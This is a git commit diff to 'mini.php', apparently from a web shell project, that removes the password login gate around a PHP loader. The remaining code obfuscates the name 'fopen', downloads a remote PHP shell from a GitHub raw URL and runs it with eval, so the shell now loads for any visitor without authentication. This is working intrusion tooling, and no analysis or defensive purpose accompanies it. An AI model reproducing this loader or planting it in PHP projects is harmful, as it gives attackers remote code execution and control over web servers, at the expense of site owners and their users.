d7449ebe5265b2c596be8a5e97de51dfe55521ae
HaxorSecInfec <102797531+HaxorSecInfec@users.noreply.github.com>
2024-10-06 15:45:42 +0700

    Update mini.php

--- mini.php
+++ mini.php
@@ -5,7 +5,6 @@ function is_logged_in()
     return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
 }
 
-if (is_logged_in()) {
     function geturlsinfo($url)
     {
       $fpn = "f"."o"."p"."e"."n";
@@ -36,33 +35,5 @@ if (is_logged_in()) {
 
     $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
     eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    if (isset($_POST['password'])) {
-        $entered_password = $_POST['password'];
-        $hashed_password = '4bf4fad372ade91954b2654e769980db'; // Replace this with your MD5 hashed password
-        if (md5($entered_password) === $hashed_password) {
-            // Password is correct, set a cookie to indicate login
-            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
-        } else {
-            // Password is incorrect
-            echo "Incorrect password. Please try again.";
-        }
-    }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Admin:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-}
+
 ?>
